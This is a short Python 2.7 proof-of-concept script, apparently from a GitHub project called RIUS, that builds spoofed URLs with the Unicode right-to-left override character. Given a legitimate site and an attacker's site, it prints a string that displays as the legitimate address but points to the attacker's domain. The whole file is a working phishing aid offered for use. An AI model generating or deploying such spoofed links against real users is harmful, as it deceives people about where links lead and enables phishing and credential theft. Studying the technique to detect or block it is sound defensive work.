# !/usr/bin/env python2.7
# coding=utf-8

#	RTLO Injection URI Spoofing
# https://github.com/zadewg/RIUS
#	Copyright (C) zadewg at gmail dot com
#	RIUS_back.py 2019 August 11th

# This POC uses a different approach than the one provided in exploit.sh

import sys

help = "usage: python poc.py <legitimate website> <attack_website> \nnote: this script might not work depending on your consoles character set"

def main():
    if len(sys.argv) != 3:
        print(help)
        raise SystemExit

    _RTLO = (u'\u202e')

    _LEGWEB = sys.argv[1][::-1] if "https://" in sys.argv[1] else str("https://" + sys.argv[1])[::-1]
    _ATTWEB = sys.argv[2].replace('https://', '')

    # [RTLO_mark][legitimate_website]#/[backwards-typed_attackers_website]
    sys.stdout.write(' ' + _RTLO + (_ATTWEB + '#/' + _LEGWEB) + '\n')

if __name__ == '__main__':
    main()
